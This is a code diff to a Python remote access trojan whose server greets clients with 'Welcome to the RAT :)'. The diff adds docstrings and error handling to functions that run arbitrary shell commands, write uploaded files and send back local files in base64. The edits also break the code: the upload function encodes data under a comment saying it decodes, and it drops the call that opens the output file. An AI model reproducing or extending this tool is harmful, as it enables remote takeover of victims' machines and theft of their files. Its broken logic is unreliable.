@@ -9,6 +9,13 @@ HEADERSIZE = 10
 PORT = 64209
 
 def retrieveMessage(s):
+    '''
+    Retrieves a message from the socket stream
+    
+    Parameters: s - The socket stream
+    
+    Returns: The message received from the socket stream
+    '''
     newMessage = True
     fullMessage = ""
     while True:
@@ -25,23 +32,56 @@ def retrieveMessage(s):
 
 ### Execute ###
 def Execute(command):
-    subprocess.Popen(command, shell=True)
-
+    '''
+    Executes a command on the server
+    
+    Parameters: command - The command to execute
+    
+    Returns: None
+    '''
+    try:
+        subprocess.call(command, shell=True)
+    except Exception as e:
+        print(e)
+    
 ### Upload ###
 def Upload(b64String, outputFile):
+    '''
+    Uploads a file to the server
     
+    Parameters: b64String - The base64 encoded string of the file
+                outputFile - The name of the file to save
+                
+    Returns: None
+    '''    
+    # Decode the base64 string
     OutputText = base64.b64encode(b64String)
+    # Write the file to the server
+    try:
+        with outputFile as OutputFile:
+            OutputFile.write(OutputText)
+    except Exception as e:
+        print(e)
     
-    OutputFile = open(outputFile, 'wb')
-    OutputFile.write(OutputText)
 
     
 ### Download ###
 def Download(fileName):
-    localFile = open(fileName, 'rb')
-    OutputText = base64.b64encode(localFile.read())
-    print(OutputText)
-    localFile.close()
+    '''
+    Downloads a file from the server
+    
+    Parameters: fileName - The name of the file to download
+    
+    Returns: The base64 encoded string of the file
+    '''
+    OutputText = ""
+    try:
+        with open(fileName, "rb") as localFile:
+            OutputText = base64.b64encode(localFile.read())
+            print(OutputText)
+    except Exception as e:
+        print(e)
+        
     return OutputText
 
 # Main code
@@ -55,6 +95,7 @@ def main():
     while True:
         # accept any incomming socket connection request
         clientsocket, address = s.accept()
+        
         print(f"Found connection at {address}! Connection successful!")
         messageForClient = "Welcome to the RAT :)"
         messageForClient = f'{len(messageForClient):<{HEADERSIZE}}' + messageForClient
